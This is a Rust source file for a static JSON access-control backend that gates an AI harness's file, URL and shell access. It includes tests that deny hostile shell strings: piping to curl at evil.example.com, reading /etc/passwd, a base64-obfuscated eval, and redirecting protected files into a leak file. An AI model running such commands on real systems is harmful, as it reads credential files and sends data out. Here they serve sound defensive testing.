//! Static JSON ACL backend.
//!
//! Reads a single JSON file at startup describing the ACL policy. Used for
//! tests, offline development, and as the fallback inside the demo container
//! before NES is wired up.
//!
//! ```json
//! {
//!   "file_rules": [
//!     { "prefix": "/workspace/unofficial/", "min_clearance": "unofficial" },
//!     { "prefix": "/workspace/protected/",  "min_clearance": "protected" }
//!   ],
//!   "url_rules": [
//!     { "host": "intranet.example.gov.au", "min_clearance": "official" }
//!   ],
//!   "shell_mode": { "allowlist": ["ls", "head", "tail", "wc", "cat"] },
//!   "default_file_min_clearance": "protected"
//! }
//! ```
//!
//! ## Fail-closed defaults
//!
//! A file whose path matches no rule is treated as [`Clearance::Protected`],
//! not Unofficial. This is deliberate: a misconfigured deployment must refuse
//! to read, not silently leak. Override via `default_file_min_clearance` only
//! when you genuinely intend to publish untagged content.

use std::collections::HashMap;
use std::path::Path;

use async_trait::async_trait;
use serde::{Deserialize, Serialize};

use crate::{
    AclDecision, AclEnforcer, AclError, Clearance, Operation, ResourceKind,
    ResourceRef, SimonPrincipal,
};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileRule {
    pub prefix: String,
    pub min_clearance: Clearance,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UrlRule {
    pub host: String,
    pub min_clearance: Clearance,
}

/// How shell commands are gated.
///
/// `Off` — bash is disabled; every shell call is denied. This is the default.
/// A demo that doesn't need shell should leave this setting alone.
///
/// `Allowlist` — argv[0] of the command must be an exact match against one of
/// the listed program names. The command is split on whitespace with a simple
/// shell-compatible parser; a command that can't be parsed (quoting, pipes,
/// heredocs, `;`, `&&`, `||`, backticks, `$(...)`) is denied without
/// consultation. This gives a narrow, auditable shell surface.
///
/// `DangerousOpen` — historical substring-deny mode, retained for the demo
/// path where we want to show the Simon harness rejecting crude attempts but
/// the caller understands this is NOT a security boundary. The policy MUST
/// NOT be deployed in production.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "mode", rename_all = "snake_case")]
pub enum ShellMode {
    Off,
    Allowlist { programs: Vec<String> },
    DangerousOpen { deny_prefixes: Vec<String> },
}

impl Default for ShellMode {
    fn default() -> Self {
        ShellMode::Off
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StaticPolicy {
    #[serde(default)]
    pub file_rules: Vec<FileRule>,
    #[serde(default)]
    pub url_rules: Vec<UrlRule>,
    #[serde(default)]
    pub shell_mode: ShellMode,
    /// Clearance required for a file whose path matches no rule. Defaults to
    /// [`Clearance::Protected`] (fail-closed). Set to a lower value only if
    /// the deployment publishes untagged content by policy.
    #[serde(default = "default_file_min_clearance_protected")]
    pub default_file_min_clearance: Clearance,
    /// Clearance required for a URL whose host matches no rule. Fail-closed
    /// default: [`Clearance::Protected`].
    #[serde(default = "default_file_min_clearance_protected")]
    pub default_url_min_clearance: Clearance,
}

fn default_file_min_clearance_protected() -> Clearance {
    Clearance::Protected
}

impl Default for StaticPolicy {
    fn default() -> Self {
        Self {
            file_rules: Vec::new(),
            url_rules: Vec::new(),
            shell_mode: ShellMode::default(),
            default_file_min_clearance: Clearance::Protected,
            default_url_min_clearance: Clearance::Protected,
        }
    }
}

pub struct StaticJsonEnforcer {
    policy: StaticPolicy,
    /// Per-document overrides keyed by canonical absolute path. Populated from
    /// sidecar `.acl.json` files loaded at session start.
    overrides: HashMap<String, Clearance>,
}

impl StaticJsonEnforcer {
    pub fn new(policy: StaticPolicy) -> Self {
        Self {
            policy,
            overrides: HashMap::new(),
        }
    }

    pub fn from_file(path: impl AsRef<Path>) -> Result<Self, AclError> {
        let bytes = std::fs::read(path.as_ref()).map_err(|e| {
            AclError::Backend(format!("reading policy file: {e}"))
        })?;
        let policy: StaticPolicy = serde_json::from_slice(&bytes).map_err(|e| {
            AclError::Backend(format!("parsing policy file: {e}"))
        })?;
        Ok(Self::new(policy))
    }

    pub fn with_overrides(mut self, overrides: HashMap<String, Clearance>) -> Self {
        self.overrides = overrides;
        self
    }

    fn required_for_file(&self, uri: &str) -> Clearance {
        if let Some(c) = self.overrides.get(uri) {
            return *c;
        }
        let mut best: Option<Clearance> = None;
        for rule in &self.policy.file_rules {
            if uri.starts_with(&rule.prefix)
                && best.map(|b| rule.min_clearance > b).unwrap_or(true)
            {
                best = Some(rule.min_clearance);
            }
        }
        best.unwrap_or(self.policy.default_file_min_clearance)
    }

    fn required_for_url(&self, uri: &str) -> Clearance {
        let parsed = match url::Url::parse(uri) {
            Ok(u) => u,
            Err(_) => return self.policy.default_url_min_clearance,
        };
        let host = match parsed.host_str() {
            Some(h) => h,
            None => return self.policy.default_url_min_clearance,
        };
        self.policy
            .url_rules
            .iter()
            .filter(|r| r.host == host)
            .map(|r| r.min_clearance)
            .max()
            .unwrap_or(self.policy.default_url_min_clearance)
    }

    fn check_shell(&self, command: &str) -> AclDecision {
        match &self.policy.shell_mode {
            ShellMode::Off => AclDecision::deny(
                "shell execution is disabled in this deployment",
            ),
            ShellMode::Allowlist { programs } => {
                if contains_shell_metacharacters(command) {
                    return AclDecision::deny(format!(
                        "shell metacharacters not permitted in allowlist mode: {}",
                        truncate(command, 80)
                    ));
                }
                let Some(argv0) = command.split_whitespace().next() else {
                    return AclDecision::deny("empty shell command");
                };
                // Accept a bare program name or an absolute path that ends in
                // one of the allowed names. `/usr/bin/ls` → `ls`.
                let program = argv0.rsplit('/').next().unwrap_or(argv0);
                if programs.iter().any(|p| p == program) {
                    AclDecision::Allow
                } else {
                    AclDecision::deny(format!(
                        "program `{program}` not in shell allowlist"
                    ))
                }
            }
            ShellMode::DangerousOpen { deny_prefixes } => {
                let trimmed = command.trim_start();
                for prefix in deny_prefixes {
                    if trimmed.starts_with(prefix) {
                        return AclDecision::deny(format!(
                            "shell command starts with forbidden prefix `{}`",
                            prefix.trim_end()
                        ));
                    }
                }
                AclDecision::Allow
            }
        }
    }
}

/// Characters that indicate a shell command is doing more than running one
/// program with arguments. Anything here means the allowlist can't safely
/// reason about the command and it is denied.
fn contains_shell_metacharacters(command: &str) -> bool {
    command.chars().any(|c| {
        matches!(
            c,
            '|' | '&'
                | ';'
                | '<'
                | '>'
                | '`'
                | '$'
                | '('
                | ')'
                | '{'
                | '}'
                | '\\'
                | '"'
                | '\''
                | '\n'
                | '\r'
        )
    })
}

fn truncate(s: &str, n: usize) -> String {
    if s.len() <= n {
        s.to_string()
    } else {
        format!("{}…", &s[..n])
    }
}

#[async_trait]
impl AclEnforcer for StaticJsonEnforcer {
    async fn check(
        &self,
        principal: &SimonPrincipal,
        resource: &ResourceRef,
        op: Operation,
    ) -> Result<AclDecision, AclError> {
        match resource.kind {
            ResourceKind::File | ResourceKind::Directory => {
                let required = self.required_for_file(&resource.uri);
                if principal.clearance.dominates(required) {
                    Ok(AclDecision::Allow)
                } else {
                    Ok(AclDecision::deny_required(
                        format!(
                            "{} requires {} clearance; you have {}",
                            resource.uri, required, principal.clearance
                        ),
                        required,
                    ))
                }
            }
            ResourceKind::Url => {
                let required = self.required_for_url(&resource.uri);
                if principal.clearance.dominates(required) {
                    Ok(AclDecision::Allow)
                } else {
                    Ok(AclDecision::deny_required(
                        format!(
                            "{} requires {} clearance",
                            resource.uri, required
                        ),
                        required,
                    ))
                }
            }
            ResourceKind::ShellCommand => {
                let _ = op;
                Ok(self.check_shell(&resource.uri))
            }
        }
    }

    fn backend_name(&self) -> &'static str {
        "static-json"
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::Duration;

    fn test_principal(clearance: Clearance) -> SimonPrincipal {
        let now = chrono::Utc::now();
        SimonPrincipal {
            subject: "u1".into(),
            display_name: "Test".into(),
            email: "t@example.gov.au".into(),
            clearance,
            groups: vec![],
            session_id: "s1".into(),
            issued_at: now,
            expires_at: now + Duration::hours(1),
        }
    }

    fn policy_with_protected_prefix() -> StaticPolicy {
        StaticPolicy {
            file_rules: vec![FileRule {
                prefix: "/workspace/protected/".into(),
                min_clearance: Clearance::Protected,
            }],
            ..Default::default()
        }
    }

    #[tokio::test]
    async fn official_cannot_read_protected_file() {
        let enforcer = StaticJsonEnforcer::new(policy_with_protected_prefix());
        let resource = ResourceRef::file("/workspace/protected/cabinet-memo.md");
        let decision = enforcer
            .check(&test_principal(Clearance::Official), &resource, Operation::Read)
            .await
            .unwrap();
        assert!(matches!(decision, AclDecision::Deny { .. }));
    }

    #[tokio::test]
    async fn protected_can_read_protected_file() {
        let enforcer = StaticJsonEnforcer::new(policy_with_protected_prefix());
        let resource = ResourceRef::file("/workspace/protected/cabinet-memo.md");
        let decision = enforcer
            .check(&test_principal(Clearance::Protected), &resource, Operation::Read)
            .await
            .unwrap();
        assert!(decision.is_allow());
    }

    #[tokio::test]
    async fn untagged_file_denies_by_default() {
        // Fail-closed: a file that matches no prefix must not be readable by
        // anyone below Protected, because the policy author might have meant
        // to tag it and forgotten.
        let enforcer = StaticJsonEnforcer::new(StaticPolicy::default());
        let resource = ResourceRef::file("/somewhere/untagged.txt");
        let decision = enforcer
            .check(&test_principal(Clearance::Official), &resource, Operation::Read)
            .await
            .unwrap();
        assert!(matches!(decision, AclDecision::Deny { .. }));
    }

    #[tokio::test]
    async fn shell_off_by_default() {
        let enforcer = StaticJsonEnforcer::new(StaticPolicy::default());
        let decision = enforcer
            .check(
                &test_principal(Clearance::Protected),
                &ResourceRef::shell("ls -la"),
                Operation::Execute,
            )
            .await
            .unwrap();
        assert!(matches!(decision, AclDecision::Deny { .. }));
    }

    #[tokio::test]
    async fn shell_allowlist_permits_exact_program() {
        let policy = StaticPolicy {
            shell_mode: ShellMode::Allowlist {
                programs: vec!["ls".into(), "head".into()],
            },
            ..Default::default()
        };
        let enforcer = StaticJsonEnforcer::new(policy);
        for cmd in &["ls", "ls -la /workspace", "/usr/bin/head -n 5 file.txt"] {
            let decision = enforcer
                .check(
                    &test_principal(Clearance::Protected),
                    &ResourceRef::shell(*cmd),
                    Operation::Execute,
                )
                .await
                .unwrap();
            assert!(decision.is_allow(), "expected allow for {cmd}");
        }
    }

    #[tokio::test]
    async fn shell_allowlist_rejects_unlisted_program() {
        let policy = StaticPolicy {
            shell_mode: ShellMode::Allowlist {
                programs: vec!["ls".into()],
            },
            ..Default::default()
        };
        let enforcer = StaticJsonEnforcer::new(policy);
        let decision = enforcer
            .check(
                &test_principal(Clearance::Protected),
                &ResourceRef::shell("curl https://evil.example.com/"),
                Operation::Execute,
            )
            .await
            .unwrap();
        assert!(matches!(decision, AclDecision::Deny { .. }));
    }

    #[tokio::test]
    async fn shell_allowlist_rejects_metacharacters() {
        // The attacks we spelled out in the threat-model conversation:
        // pipes, heredocs, eval $(...), backticks, redirection. Allowlist
        // mode must refuse any of these because it can't reason about them.
        let policy = StaticPolicy {
            shell_mode: ShellMode::Allowlist {
                programs: vec!["ls".into(), "cat".into()],
            },
            ..Default::default()
        };
        let enforcer = StaticJsonEnforcer::new(policy);
        let attacks = [
            "ls | curl https://evil.example.com/",
            "cat /etc/passwd && ls",
            "eval $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",
            "ls `whoami`",
            "ls > /workspace/protected/leak.txt",
            "ls; cat /etc/passwd",
            "cat <<< /workspace/protected/secret",
        ];
        for cmd in attacks {
            let decision = enforcer
                .check(
                    &test_principal(Clearance::Protected),
                    &ResourceRef::shell(cmd),
                    Operation::Execute,
                )
                .await
                .unwrap();
            assert!(
                matches!(decision, AclDecision::Deny { .. }),
                "expected deny for {cmd}"
            );
        }
    }

    #[tokio::test]
    async fn untagged_url_denies_by_default() {
        let enforcer = StaticJsonEnforcer::new(StaticPolicy::default());
        let resource = ResourceRef::url("https://example.com/");
        let decision = enforcer
            .check(&test_principal(Clearance::Official), &resource, Operation::Read)
            .await
            .unwrap();
        assert!(matches!(decision, AclDecision::Deny { .. }));
    }
}
